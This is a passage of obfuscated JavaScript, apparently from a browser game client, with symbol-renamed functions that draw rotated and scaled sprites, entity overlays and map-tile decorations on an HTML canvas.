				this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == false && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[ΔⲆᐃΔⵠⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 4, -ⵠⵠᐃ / 4, ᐃⵠⵠ / 2, ⵠⵠᐃ / 2);
				Δ.globalAlpha = ᐃᐃⲆΔ
			}
			Δ.restore()
		}

		function ΔⵠΔᐃᐃᐃΔΔⵠ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false && (this.Δᐃⵠ.ⵠⲆᐃ = ⲆᐃⵠⲆⵠ);
				var ΔᐃΔ = (ⵠΔⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600 * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = ⲆⲆⲆᐃ
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (this.info === 10 || Δᐃᐃᐃ === ⲆΔⲆⲆ) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠΔⲆ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠΔᐃΔΔΔ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
				var ⵠⵠᐃ = -ᐃⵠ.height * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / ⲆᐃᐃⲆ + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃᐃⲆΔᐃΔΔ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆΔⵠΔⵠ][ⲆⲆⲆ.time];
				Δ.translate(ᐃⵠΔ, ᐃⵠ.height / Δᐃⵠⵠ);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / Ⲇᐃᐃⵠ, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ⲆⲆⵠᐃⲆⲆⲆΔᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == ΔⵠΔⲆΔ) this.Δᐃⵠ.ⵠⲆᐃ = ⲆΔᐃⲆΔ;
				var ΔᐃΔ = ᐃⵠᐃᐃ * (ΔᐃⲆⵠ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * 600 * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (this.info === 10 || 0 === ⲆΔⲆⲆ) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃΔᐃ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.Ⲇⵠᐃᐃⵠⵠⵠ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = -ᐃⵠ.width * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				var ⵠⵠᐃ = -ᐃⵠ.height * this.ⵠⲆⲆⵠ.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / Ⲇᐃᐃⵠ + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⲆⵠⵠᐃ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔΔᐃⲆ][ⲆⲆⲆ.time];
				Δ.translate(Δᐃᐃᐃ, ᐃⵠ.height / 2);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / 2, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ΔᐃΔⲆⲆᐃᐃⵠΔ(ᐃΔ, Δⵠ, ⲆⵠⲆ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + Δⵠ, ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⲆ);
			Δ.rotate(this.angle);
			Δ.translate(this.x - Δⵠ, this.y - ⲆⵠⲆ);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ;
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠⵠΔⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ᐃᐃᐃⲆΔᐃᐃᐃᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ΔΔⲆᐃ.ᐃⵠⵠᐃ(this, this.r) > 300 ? this.scale = Math.min(this.scale + ᐃⵠᐃᐃ / ⲆᐃᐃⲆ, 1.8) : this.scale = Math.max(this.scale - ᐃⵠᐃᐃ, ⵠΔⲆ);
			this.ᐃΔⲆⲆ.ⵠⲆᐃ();
			this.rotate.ⵠⲆᐃ();
			ᐃⵠ = ⵠⲆ[Ⲇ.ΔΔⵠΔΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = -ᐃⵠ.height * this.ᐃΔⲆⲆ.ΔᐃΔ * this.scale;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠⵠⵠΔ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				if (this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == ᐃⵠⵠⲆᐃ) this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ;
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⲆᐃⲆᐃΔⵠ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / 2, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ΔⵠΔⵠ
			}
			ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆᐃᐃΔⲆΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = this.scale * (-ᐃⵠ.width * this.ᐃΔⲆⲆ.ΔᐃΔ);
			ⵠⵠᐃ = this.ᐃΔⲆⲆ.ΔᐃΔ * -ᐃⵠ.height * this.scale;
			Δ.save();
			Δ.translate(ᐃ * -30, 70 * ᐃ);
			Δ.rotate(this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, -10 * ᐃ, ᐃ * -40, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆΔⲆᐃⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -10 * ᐃ, ᐃ * -40, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = 1
			}
			Δ.restore();
			ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⵠᐃⲆⵠΔⲆ][ⲆⲆⲆ.time];
			Δ.save();
			Δ.translate(ᐃ * 30, ᐃ * 70);
			Δ.rotate(-this.rotate.ΔᐃΔ);
			ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * ⲆⲆⲆΔᐃ - ᐃⵠⵠ, -40 * ᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠⲆⵠΔΔ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃ * ⲆⲆᐃΔΔ - ᐃⵠⵠ, -40 * ᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ⵠΔᐃ
			}
			Δ.restore();
			Δ.restore()
		}

		function ⵠΔΔⲆⲆⲆⵠⲆᐃ(ⲆᐃⵠΔ, ⲆⲆᐃΔ, ΔⲆΔⲆ, ⵠⵠⲆⵠ, ᐃΔ, ΔᐃⲆ, ᐃᐃᐃᐃ, ⵠᐃΔᐃ, Δⵠⵠᐃⵠ) {
			undefined === ⵠᐃΔᐃ && (ⵠᐃΔᐃ = 0);
			for (var ⵠᐃ = ⲆᐃⵠΔ; ⵠᐃ <= ⲆⲆᐃΔ; ⵠᐃ++) {
				for (var ᐃⵠᐃⵠ = ΔⲆΔⲆ; ᐃⵠᐃⵠ <= ⵠⵠⲆⵠ; ᐃⵠᐃⵠ++) {
					var ⵠᐃᐃᐃ = ΔⲆΔⵠⲆ.ᐃΔⵠⲆ[ⵠᐃ][ᐃⵠᐃⵠ];
					if (ⵠᐃᐃᐃ === ᐃⵠᐃⵠᐃ || undefined === ⵠᐃᐃᐃ[ΔᐃⲆ]) continue;
					var ⲆⵠⵠΔΔ = ⵠᐃᐃᐃ[ΔᐃⲆ];
					var ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time][ⲆⵠⵠΔΔ.ΔᐃᐃᐃᐃⲆᐃ];
					ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠ.width / (ΔΔⵠᐃⲆ * ⵠΔᐃΔ), ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ᐃⵠ.height / (ΔΔⵠᐃⲆ * 4), ᐃⵠ.width / (2 * ΔΔⵠᐃⲆ), ᐃⵠ.height / (ⵠⲆⵠⲆ * ΔΔⵠᐃⲆ));
					if (ⵠⲆᐃΔ.ᐃⲆᐃΔⲆ) {
						var ⵠΔᐃΔⵠ = 2147483648;
						var ⲆⲆᐃⲆ = 1103515245;
						var ⲆΔᐃⲆ = 12345;
						var ΔΔᐃⲆⵠ = ((1e3 * ⵠᐃ + ᐃⵠᐃⵠ) * ⲆⲆᐃⲆ + ⲆΔᐃⲆ) % ⵠΔᐃΔⵠ / ⵠΔᐃΔⵠ;
						if (ΔΔᐃⲆⵠ < .2) {
							ΔΔᐃⲆⵠ = Math.floor(ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][ⲆⲆⲆ.time][ⲆⵠⵠΔΔ.ΔᐃᐃᐃᐃⲆᐃ].length * (ΔΔᐃⲆⵠ * ΔⲆΔΔ));
							var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠΔᐃⵠ][ⲆⲆⲆ.time][ⲆⵠⵠΔΔ.ΔᐃᐃᐃᐃⲆᐃ][ΔΔᐃⲆⵠ];
							ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠ.width / (ΔΔⵠᐃⲆ * 4), ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ᐃⵠ.height / (4 * ΔΔⵠᐃⲆ), ᐃⵠ.width / (ΔΔⵠᐃⲆ * ⵠⵠΔⲆ), ᐃⵠ.height / (ΔΔⵠᐃⲆ * ⲆΔΔⵠ))
						} else if (ΔᐃΔΔ !== ⲆⵠⵠΔΔ.ⲆⲆⲆᐃⲆΔΔ) {
							var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⲆⵠⵠΔᐃ][ⲆⲆⲆ.time];
							var ᐃⲆⲆᐃᐃΔⵠ = (ΔⵠΔⵠⲆⵠΔ + ⵠᐃ % 2 * 30) % 60;
							Δ.globalAlpha = ᐃⲆⲆᐃᐃΔⵠ < 30 ? ᐃⲆⲆᐃᐃΔⵠ / 30 : ⵠΔⲆ - (ᐃⲆⲆᐃᐃΔⵠ - 30) / 30;
							ΔⲆΔⵠ(Δ, ᐃⵠ, ᐃᐃΔ.ⲆΔΔ.x + ⲆⵠⵠΔΔ.x - ᐃⵠ.width / (4 * ΔΔⵠᐃⲆ), ᐃᐃΔ.ⲆΔΔ.y + ⲆⵠⵠΔΔ.y - ᐃⵠ.height / (ΔΔⵠᐃⲆ * 4) - 30 + ᐃⲆⲆᐃᐃΔⵠ, ᐃⵠ.width / (ΔΔⵠᐃⲆ * ᐃⲆⵠᐃ), ᐃⵠ.height / (ΔΔⵠᐃⲆ * 2));
							Δ.globalAlpha = ᐃᐃⲆΔ
						}
					}
				}
			}
		}

		function ᐃⵠⵠΔⵠⵠⵠⲆⵠ(ᐃΔ, ΔⲆᐃΔⵠⲆⲆ) {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			ᐃⵠ = ⵠⲆ[ᐃΔ][ⲆⲆⲆ.time];
			ᐃⵠⵠ = -ᐃⵠ.width;
			ⵠⵠᐃ = -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⵠⵠΔⲆ, -ⵠⵠᐃ / ⵠⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			if (this.action & ⵠⵠⵠⲆ.ⵠΔΔΔ) {
				this.Δᐃⵠ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃⲆΔ == false && (this.action -= ⵠⵠⵠⲆ.ⵠΔΔΔ);
				Δ.globalAlpha = .6 - this.Δᐃⵠ.ΔᐃΔ;
				var ᐃⵠ = ⵠⲆ[ΔⲆᐃΔⵠⲆⲆ];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⵠΔⲆᐃ, ᐃⵠⵠ, ⵠⵠᐃ);
				Δ.globalAlpha = ᐃⲆᐃ
			}
			Δ.restore()
		}

		function ⲆᐃΔᐃΔⲆⵠΔᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				if (this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ == false) this.Δᐃⵠ.ⵠⲆᐃ = ᐃⵠΔⵠⲆ;
				var ΔᐃΔ = 600 * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ) * ᐃ;
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = ΔᐃΔ * Math.cos(this.Δᐃⵠ.angle - this.angle)
			} else {
				var Δⵠ = Ⲇᐃᐃᐃ;
				var ⲆⵠⲆ = 0
			}
			var ⲆΔⲆⲆ = this.info & 15;
			if (ⵠⵠΔⲆᐃ === this.info || 0 === ⲆΔⲆⲆ) {
				Δ.rotate(this.angle);
				this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃΔⵠᐃⲆⵠⵠ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⵠⵠⵠⵠⲆᐃⵠ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
				var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				if (this.info & 16) var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠⵠΔᐃⲆⲆ][ⲆⲆⲆ.time];
				else var ᐃⵠ = ⵠⲆ[Ⲇ.ⲆⲆⲆᐃᐃΔᐃ][ⲆⲆⲆ.time];
				Δ.translate(Ⲇᐃᐃᐃ, ᐃⵠ.height / 2);
				ΔⲆΔⵠ(Δ, ᐃⵠ, Δⵠ - ᐃⵠ.width / ⲆⲆΔᐃ, -ᐃⵠ.height + ⲆⵠⲆ)
			}
			Δ.restore()
		}

		function ⵠᐃᐃⵠⲆΔΔᐃⲆ() {
			if (10 > this.info) return;
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && ⲆⵠΔⵠΔ == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * ((1 - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ) * ᐃⵠᐃᐃ * 600);
				var Δⵠ = Math.sin(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ;
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = 0;
				var ⲆⵠⲆ = 0
			}
			this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
			var ᐃⵠ = ⵠⲆ[Ⲇ.ΔⵠᐃΔᐃⵠⲆ][ⲆⲆⲆ.time];
			var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
			var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2 + Δⵠ, -ⵠⵠᐃ / 2 + ⲆⵠⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.restore()
		}

		function ΔⵠᐃΔⲆᐃⵠᐃⲆ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			this.ⵠⲆⲆⵠ.ⵠⲆᐃ();
			Δ.globalAlpha = .3;
			var ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⵠⲆⵠⵠΔⵠ][ⲆⲆⲆ.time];
			var ᐃⵠⵠ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.width;
			var ⵠⵠᐃ = this.ⵠⲆⲆⵠ.ΔᐃΔ * -ᐃⵠ.height;
			ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / 2, -ⵠⵠᐃ / ⲆᐃᐃⲆ, ᐃⵠⵠ, ⵠⵠᐃ);
			Δ.globalAlpha = 1;
			Δ.restore()
		}

		function ᐃΔⲆᐃⵠⲆⵠΔᐃ() {
			Δ.save();
			Δ.translate(ᐃᐃΔ.ⲆΔΔ.x + this.x, ᐃᐃΔ.ⲆΔΔ.y + this.y);
			Δ.rotate(this.angle);
			if (this.Δᐃⵠ.ⵠⲆᐃ) {
				this.Δᐃⵠ.ᐃᐃⵠΔ.ⵠⲆᐃ() && false == this.Δᐃⵠ.ᐃᐃⵠΔ.ᐃⲆΔ && (this.Δᐃⵠ.ⵠⲆᐃ = false);
				var ΔᐃΔ = ᐃ * (600 * (ᐃⵠᐃᐃ * (ⲆⵠⲆⲆ - this.Δᐃⵠ.ᐃᐃⵠΔ.ΔᐃΔ)));
				var Δⵠ = ΔᐃΔ * Math.sin(this.Δᐃⵠ.angle - this.angle);
				var ⲆⵠⲆ = Math.cos(this.Δᐃⵠ.angle - this.angle) * ΔᐃΔ
			} else {
				var Δⵠ = ΔΔⵠⵠ;
				var ⲆⵠⲆ = ⵠᐃⲆᐃ
			}
			if (this.info & 31 && this.info & 992 && (this.info & 31744) != 31744) {
				ᐃⵠ = ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔΔᐃ][ⲆⲆⲆ.time];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2 + Δⵠ, -ᐃⵠ.height / 2 + ⲆⵠⲆ);
				this.up.ⵠⲆᐃ();
				var ᐃⵠ = ⵠⲆ[Ⲇ.ΔᐃⲆᐃⵠⵠᐃ][ⲆⲆⲆ.time];
				var ᐃⵠⵠ = this.up.ΔᐃΔ * -ᐃⵠ.width;
				var ⵠⵠᐃ = -ᐃⵠ.height * this.up.ΔᐃΔ;
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠⵠ / ⲆⲆΔᐃ + ᐃ * 1, -ⵠⵠᐃ / 2 + 3 * ᐃ, ᐃⵠⵠ, ⵠⵠᐃ)
			} else {
				ᐃⵠ = ⵠⲆ[Ⲇ.ᐃⲆⲆΔΔⲆⲆ][ⲆⲆⲆ.time];
				ΔⲆΔⵠ(Δ, ᐃⵠ, -ᐃⵠ.width / 2 + Δⵠ, -ᐃⵠ.height / 2 + ⲆⵠⲆ)
			}
			Δ.restore()
		}
		var ΔΔΔΔⲆⲆⲆⲆⲆ = function(Ⲇⵠᐃᐃᐃ) {
			if (ᐃⵠΔ < Ⲇⵠᐃᐃᐃ) {
				var ᐃⵠ = ⵠⲆ[Ⲇⵠᐃᐃᐃ][ⲆⲆⲆ.time];
				switch (Ⲇⵠᐃᐃᐃ) {
					case Ⲇ.ᐃⵠⵠⲆΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 + ᐃ * 2, -ᐃⵠ.height / 2 - ᐃ * ᐃΔΔΔ);
						break;
					case Ⲇ.ΔⵠᐃⲆⵠ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / Δᐃⵠⵠ, -ᐃⵠ.height / 2 - ᐃ * 18);
						break;
					case Ⲇ.ᐃᐃⲆⵠᐃ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / Δⵠⵠⵠ - ᐃ * 10);
						break;
					case Ⲇ.ΔⵠⲆⵠΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / 2 - 19 * ᐃ);
						break;
					case Ⲇ.ᐃⵠΔⲆᐃ:
						ⲆΔΔⵠΔ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆΔⵠᐃ, -ᐃⵠ.height / 4 - ᐃ * 20);
						break;
					case Ⲇ.ⵠΔΔᐃⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / Δᐃⵠⵠ - ᐃ * 1, -ᐃⵠ.height / ᐃⲆⵠᐃ - 23 * ᐃ);
						break;
					case Ⲇ.ⲆⵠⲆⵠΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2, -ᐃⵠ.height / ⵠΔⲆᐃ - ᐃ * ᐃΔΔⲆ);
						break;
					case Ⲇ.ᐃΔⲆⲆⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ᐃⲆΔⲆ, -ᐃⵠ.height / 2 - ᐃ * 2);
						break;
					case Ⲇ.ⲆⵠΔⲆΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 + ᐃ * 1.5, -ᐃⵠ.height / Ⲇᐃᐃⵠ - ᐃ * 1);
						break;
					case Ⲇ.ⵠⵠⲆⲆᐃ:
					case Ⲇ.ᐃⵠᐃⲆⲆ:
					case Ⲇ.ᐃᐃΔΔΔ:
					case Ⲇ.ΔⵠⲆΔᐃ:
					case Ⲇ.ⲆⲆΔᐃᐃ:
					case Ⲇ.ⲆⲆⵠᐃᐃ:
					case Ⲇ.ⵠⲆⵠΔⵠ:
					case Ⲇ.ⵠⵠᐃⵠΔ:
					case Ⲇ.ⲆᐃⲆΔⵠ:
					case Ⲇ.ΔᐃⲆⵠΔ:
					case Ⲇ.ⲆᐃⲆᐃⲆ:
						ⲆΔΔⵠΔ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 4, -ᐃⵠ.height / ⲆⵠᐃΔ + ᐃⲆⵠᐃΔ * ᐃ);
						break;
					case Ⲇ.ΔⵠᐃⲆⲆ:
					case Ⲇ.ΔⲆΔⵠⵠ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / Ⲇᐃᐃⵠ - 5 * ᐃ, -ᐃⵠ.height / ⵠΔⲆᐃ - ᐃ * 2);
						break;
					case Ⲇ.ⲆⵠΔᐃⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⵠΔⲆ, -ᐃⵠ.height / ⲆᐃᐃⲆ - 2 * ᐃ);
						break;
					case Ⲇ.ΔᐃᐃΔᐃ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆΔΔⵠ, -ᐃⵠ.height / Δⵠⵠⵠ - ᐃ * ⵠΔⲆᐃ);
						break;
					case Ⲇ.ᐃⲆΔΔⵠ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ΔⲆΔΔΔ, -ᐃⵠ.height / ΔⵠᐃⲆ - ᐃ * 2);
						break;
					case Ⲇ.ΔⵠᐃΔⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 + ᐃ * ⲆⵠΔΔ, -ᐃⵠ.height / ⵠⵠⵠΔ);
						break;
					case Ⲇ.ⵠᐃⲆⲆⵠ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆᐃᐃⲆ, -ᐃⵠ.height / ⵠΔᐃᐃⵠ - ᐃ * 5);
						break;
					case Ⲇ.Ⲇⵠᐃⵠⵠ:
					case Ⲇ.ᐃΔⵠⲆⲆ:
					case Ⲇ.ΔᐃᐃΔΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / 2 - ⵠΔⲆ * ᐃ, -ᐃⵠ.height / 2);
						break;
					case Ⲇ.ⲆⵠᐃΔΔ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ᐃⲆΔⲆ, -ᐃⵠ.height / Ⲇᐃᐃⵠ + 2 * ᐃ);
						break;
					case Ⲇ.ⲆⲆΔⲆᐃ:
					case Ⲇ.ᐃΔⲆᐃⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⲆⵠΔΔ, -ᐃⵠ.height / ᐃⲆΔⲆ + 8 * ᐃ);
						break;
					case Ⲇ.ΔⲆⲆⲆⲆ:
						ᐃᐃⲆⲆⵠ(Ⲇⵠᐃᐃᐃ, ᐃⵠ, -ᐃⵠ.width / ⵠⲆⵠⲆ, -ᐃⵠ.height / 2 - ᐃ * 4);
						break
